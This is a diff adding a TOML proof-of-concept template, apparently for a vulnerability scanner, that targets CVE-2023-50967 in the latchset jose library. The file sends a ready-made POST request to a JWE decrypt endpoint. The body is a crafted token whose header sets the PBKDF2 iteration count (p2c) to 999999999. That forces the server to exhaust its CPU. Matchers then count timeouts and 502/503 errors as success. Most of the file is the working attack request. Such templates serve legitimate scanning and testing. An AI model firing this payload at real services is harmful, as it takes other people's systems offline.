@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "latchset jose 库解析 JWE 时，p2c 参数控制 PBKDF2 迭代次数。构造包含极大 p2c 值（如 999999999）的恶意 JWE 令牌并发送给使用 jose 库的服务端，服务端解析时将执行天文次数的 PBKDF2 哈希迭代，导致 CPU 100% 耗尽，造成拒绝服务。"
+id = "POC-AVE-2023-0341"
+name = "latchset jose p2c 超大值拒绝服务 PoC"
+severity = "high"
+tags = [
+    "cve-2023-50967",
+    "jose",
+    "denial-of-service",
+]
+vuln_id = [
+    "CVE-2023-50967",
+    "AVE-2023-0341",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/jwe/decrypt"
+protocol = "http"
+
+[poc.requests.body]
+content = "eyJhbGciOiJQQkVTMi1IUzI1NiIsImVuYyI6IkExMjhHQ00iLCJwMmMiOjk5OTk5OTk5OSwicDJzIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEifQ..YQN0f6H6XZ6rX0Z6XZ6rX0Z6Xw.y1wz0wz0wz0wz0wz0wz0wz0wz0wz0w.4QN0f6H6XZ6rX0Z6XZ6rX0Z6Xw"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/jose"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "503",
+    "502",
+    "Service Unavailable",
+    "Gateway Timeout",
+]
